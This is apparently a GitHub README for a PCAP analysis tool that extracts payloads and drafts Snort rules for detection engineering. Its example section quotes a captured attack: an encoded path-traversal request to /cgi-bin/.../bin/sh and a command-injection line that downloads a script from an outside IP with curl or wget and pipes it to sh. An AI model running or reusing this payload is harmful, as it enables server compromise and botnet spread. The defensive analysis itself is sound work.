# PCAP-Analyzer
PCAP Analyzer – AI-Assisted Detection Engineering Tool

<img width="308" height="116" alt="image" src="https://github.com/user-attachments/assets/367475dd-f90f-49ea-a685-9c8fb1a6854a" />

Overview

This project presents an experimental Detection Engineering Automation Framework designed to support IPS/IDS rule drafting workflows.

The system analyzes uploaded PCAP files, extracts full payload data, detects suspicious patterns, and automatically generates draft Snort rules. Additionally, it provides payload visualization (Hex + ASCII), rule specificity scoring, and false positive estimation.

This tool does not replace detection engineers, but assists in accelerating the initial rule drafting process.


📦 What is app.py?
app.py is the main file that runs your web application. Think of it as the engine or control tower of your project.

Here’s what it typically does in simple terms:

Starts the Web Server: It contains the code that tells your computer to turn into a mini web server, ready to listen for visitors.

Handles Requests: When someone visits your app's URL (like http://127.0.0.1:5000), app.py decides what to do. For example:

If they go to the homepage (/), it might show them a welcome message.

If they submit a form, it might process that information.

Runs the Logic: It holds the main instructions (the "brain") of your app. It can calculate things, talk to a database, or use other files (like HTML templates) to build a webpage to show the user.

In short, when you run the command python app.py in your terminal, you are starting your entire web application.

<img width="643" height="314" alt="image" src="https://github.com/user-attachments/assets/624bbfb7-f269-4f97-a2fe-0b35c27e509f" />
<img width="1529" height="727" alt="image" src="https://github.com/user-attachments/assets/68a0d51d-c7fd-499a-b649-2304cb974271" />



🚀 Key Features

1️⃣ PCAP Upload & Full Payload Extraction

Users upload a PCAP file via web interface:

PCAP Analyzer - Full Payload Viewer
📁 Upload PCAP File
🚀 Start Analysis

The system parses packets using Scapy and extracts:

Raw payload layer

Full hex dump

ASCII preview

Payload metadata statistics

2️⃣ Analysis Statistics Dashboard

Example Output:

📊 Analysis Statistics
Packets with Payload: 5
Patterns Detected: 5
Rules Generated: 1
Total Data: 1795 bytes
Meaning of Each Metric
Metric	Description
Packets with Payload	Packets containing Raw layer
Patterns Detected	Suspicious payload signatures identified
Rules Generated	Deduplicated Snort draft rules
Total Data	Total analyzed payload size

3️⃣ Automated Snort Rule Generation

The system extracts high-signal content patterns and generates draft rules.

Example Generated Rule
alert ip any any -> any any 
(msg:"Payload Rule"; 
 content:"POST /cgi-bin/.%2e/.%2e/.%2e/."; 
 sid:1000001;)
False Positive Risk Estimation
False Positive Score: 32.01/100 (Medium - Review Recommended)

Score Logic (Experimental):

Payload uniqueness

Content repetition frequency

Pattern specificity

Printable character ratio

Interpretation:

Score Range	Meaning
0–20	Low FP Risk
21–60	Medium (Review Recommended)
61–100	High FP Risk
4️⃣ Full Payload Viewer (Core Differentiator)

Each packet provides:

Pattern detection flags

Full hex dump

ASCII rendering

Raw data preview

Payload entropy indicators

🔍 Example Detected Attack (From Sample PCAP)
Packet #1 – Pattern Detected

Detected Pattern:

🌐 HTTP Request
Observed Behavior

The payload contains:

POST /cgi-bin/.%2e/.%2e/.../bin/sh HTTP/1.1

This indicates:

Encoded directory traversal attempt (.%2e)

Direct invocation of /bin/sh

Command injection via POST body

Command Injection Payload Observed
X=$(curl http://87.120.117.92/sh || wget http://87.120.117.92/sh -O-);
echo "$X" | sh -s apache.selfrep
Attack Characteristics

Remote shell download via curl/wget fallback

Execution via shell piping

Likely botnet propagation behavior

HTTP-based command staging

Payload Metadata
Printable chars: 95.0%
Null bytes: 0
ASCII range: Mixed

Interpretation:

High printable ratio → application-layer attack

No null bytes → not binary exploit

ASCII dominant → script-based payload

📦 Payload Visualization Features

Each packet supports:

Expand All
Collapse All
Show Only Patterned
Switch to ASCII View
Copy Full Hex
Copy Raw

This enables detection engineers to:

Inspect full exploit chains

Validate rule specificity

Avoid overbroad content matches

Understand attack context before deployment

🧠 Detection Engineering Philosophy

Traditional IPS rule creation workflow:

Manual PCAP inspection

Payload extraction

Signature identification

Rule syntax writing

Trial-and-error FP tuning

This framework automates steps 1–3 and drafts step 4.

Engineers remain responsible for:

Context validation

Flow scoping

Performance optimization

Deployment tuning

🏗 System Architecture

PCAP Input Module

Payload Extraction Engine

Pattern Detection Module

Rule Draft Generator

False Positive Scoring Engine

Web Visualization Interface

Built with:

Python

Flask

Scapy

🔬 Experimental Scope

Current version supports:

Content-based rule drafting

HTTP payload inspection

Command injection pattern detection

Directory traversal detection

Basic FP scoring

Limitations:

No protocol-aware parsing yet

No behavioral correlation

No benign traffic comparison baseline

No ML-based anomaly detection

📈 Research Positioning

This tool supports research in:

Detection Engineering Automation

AI-Assisted SOC Workflows

Rule Generation Optimization

FP Reduction Strategies

Payload-Based Threat Modeling

⚠️ Disclaimer

This project is for:

Academic research

Detection engineering experimentation

Security education

Not intended for production deployment without validation.

🔮 Future Work

LLM-assisted semantic payload summarization

MITRE ATT&CK technique tagging

Context-aware rule generation

Benign dataset FP benchmarking

Protocol-aware rule scoping

Snort → Suricata compatibility

📌 Strategic Value

This project demonstrates:

Draft-level detection engineering automation is feasible.

It shifts the role of detection engineers from manual rule writers to workflow supervisors of intelligent tooling.
